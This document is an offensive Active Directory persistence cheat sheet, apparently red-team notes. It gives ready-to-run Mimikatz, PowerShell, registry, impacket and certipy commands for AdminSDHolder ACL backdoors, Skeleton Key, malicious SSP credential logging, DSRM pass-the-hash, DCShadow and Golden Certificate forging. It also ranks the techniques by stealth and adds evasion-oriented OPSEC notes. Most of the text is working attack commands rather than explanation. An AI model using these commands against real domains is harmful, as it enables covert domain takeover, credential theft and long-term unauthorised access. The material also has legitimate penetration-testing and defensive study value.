# Domain Persistence — AdminSDHolder, Skeleton Key, SSP, DCShadow

## AdminSDHolder abuse

- `AdminSDHolder` is a container whose ACL is propagated to all protected groups and users by `SDProp` every 60 minutes.
- If you add an ACE to `AdminSDHolder`, it propagates to `Domain Admins`, `Enterprise Admins`, and other protected principals.
- This survives removal of direct group membership because the ACL repropagates on the next cycle.

```powershell
# Grant full control to controlled user on AdminSDHolder
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" -PrincipalIdentity <user> -Rights All

# Verify (after SDProp runs or forced via RunProtectAdminGroupsTask)
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs | Where IdentityReferenceName -match "<user>"
```

- Force `SDProp` immediately: `Invoke-SDPropagator` or run scheduled task `\Microsoft\Windows\ActiveDirectory\ProtectAdminGroupsTask`.
- Cleanup requires removing the ACE from `AdminSDHolder` and waiting for the next propagation cycle.

```powershell
# Force propagation now
Invoke-SDPropagator -TimeoutMinutes 1 -ShowProgress
schtasks /Run /TN "\Microsoft\Windows\ActiveDirectory\ProtectAdminGroupsTask"
```

## Skeleton Key

- Patches `LSASS` on a DC to accept a master password for any domain account.
- Real passwords still work; the backdoor is transparent to users and services.
- Memory-only persistence: lost when the DC reboots.
- Mimikatz sequence: `privilege::debug` -> `misc::skeleton`.
- Default skeleton password: `mimikatz`.
- Any user can authenticate with `mimikatz` over NTLM or Kerberos while the patch is active.

```text
mimikatz # privilege::debug
mimikatz # misc::skeleton
```

```bash
# Now authenticate as any user with password "mimikatz"
crackmapexec smb <dc_ip> -u Administrator -p 'mimikatz'
evil-winrm -i <dc_ip> -u anyuser -p 'mimikatz'
```

- Limitation: only works while the patched DC is running; reboot removes it.
- Detection: Event ID `7045` if the Mimikatz driver/service is installed, plus unusual `LSASS` memory behavior.

## SSP (Security Support Provider) backdoor

- Registers a malicious SSP DLL so cleartext credentials are logged during interactive logon and service authentication.
- `mimilib.dll` is copied to `C:\Windows\System32\`.
- Captured credentials are logged to `C:\Windows\System32\kiwissp.log`.
- This persists across reboot because the SSP is loaded from the `Security Packages` registry value.

```powershell
# In-memory only (non-persistent, lost on reboot)
mimikatz # misc::memssp
# Credentials logged to C:\Windows\System32\mimilsa.log

# Persistent (survives reboot) — requires admin + registry edit
copy C:\tools\mimikatz\x64\mimilib.dll C:\Windows\System32\mimilib.dll
reg query "HKLM\System\CurrentControlSet\Control\Lsa" /v "Security Packages"
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f
```

- `memssp` is useful for short-lived collection on a DC; the registry-backed SSP is durable but leaves disk and registry artifacts.
- Persistent SSP typically requires reboot or `LSASS` restart to load the new package; reboot is the normal path on a DC.

## DSRM (Directory Services Restore Mode) abuse

- Every DC has a local `DSRM` Administrator account separate from domain admins.
- The password is set when the DC is promoted and is often never rotated.
- Extract the `DSRM` hash from the local `SAM` on the DC with `lsadump::sam`.
- Enable network logon for the `DSRM` account, then use pass-the-hash as the local Administrator on the DC.

```text
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

```powershell
# Allow DSRM account to logon over network
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2 /f

# Now pass-the-hash with DSRM admin hash
impacket-psexec -hashes :<dsrm_hash> ".\Administrator"@<dc_ip>
```

- This survives reboot and is independent of domain password resets.
- Cleanup includes restoring `DsrmAdminLogonBehavior`, rotating the `DSRM` password, and clearing any added remote-access exposure.

## DCShadow

- Registers a rogue DC in the domain and pushes replication changes through Directory Replication Service semantics.
- Requires `Domain Admin`-level privileges to register the fake DC objects and trigger replication.
- Can modify sensitive attributes without generating the usual object-change audit trail tied to standard admin tooling.
- Operationally, run two Mimikatz instances: one stages the attribute write, the other pushes replication.

```text
# Instance 1 (push changes)
mimikatz # lsadump::dcshadow /object:<target_user> /attribute:primaryGroupID /value:512

# Instance 2 (trigger replication)
mimikatz # lsadump::dcshadow /push
```

- Use cases: assign `primaryGroupID=512`, inject `SIDHistory`, modify `servicePrincipalName`, or write delegation-related attributes.
- Standard monitoring often misses the change because it arrives through replication rather than normal LDAP administration paths.

## Golden Certificate persistence

- If the AD CS CA private key is compromised, you can forge valid client-auth certificates for any user indefinitely.
- This survives `krbtgt` resets and user password changes; only CA key rollover or CA replacement invalidates the forged cert chain.

```bash
# Backup CA key material
certipy ca -backup -u admin@domain.local -p '<pass>' -ca 'CA-NAME' -target <ca_host>

# Forge a certificate for a privileged user
certipy forge -ca-pfx ca.pfx -upn administrator@domain.local -subject 'CN=Administrator'

# Authenticate with the forged certificate
certipy auth -pfx forged.pfx -domain domain.local -dc-ip <dc_ip>
```

- This is one of the strongest long-term AD persistence options because trust is anchored in PKI, not in a single account secret.

## Persistence comparison matrix

| Technique | Survives reboot | Survives password reset | Detection difficulty | Requirements |
|---|---|---|---|---|
| AdminSDHolder | Yes | Yes | Medium | WriteDacl on AdminSDHolder |
| Skeleton Key | No | N/A | Low-Medium | LSASS access on DC |
| SSP (memssp) | No | N/A | Low | LSASS access on DC |
| SSP (persistent) | Yes | N/A | Medium | Admin + registry |
| DSRM abuse | Yes | Yes | High | DC admin + SAM access |
| DCShadow | Yes (changes persist) | Depends on change | Very High | DA + 2 mimikatz instances |
| Golden Certificate | Yes | Yes | Very High | CA private key |
| SID History | Yes | Yes | Medium | DA + mimikatz |

## OPSEC notes

- AdminSDHolder: the backdoor propagates visibly to protected objects on the `SDProp` cycle; defenders can diff ACLs before and after propagation.
- Skeleton Key: patching `LSASS` on a DC is brittle and may crash authentication services if AV/EDR blocks the write.
- SSP: persistent mode leaves a DLL on disk and a registry change under `Lsa\Security Packages`; `memssp` is quieter but temporary.
- DSRM abuse: changing `DsrmAdminLogonBehavior` is a durable registry artifact and enables local-account network logon on a DC.
- DCShadow: requires two concurrent privileged sessions and precise replication staging on the same domain context.
- Golden Certificate: usually the stealthiest long-term option; CA re-keying is rare, so forged cert capability can outlive account remediation.
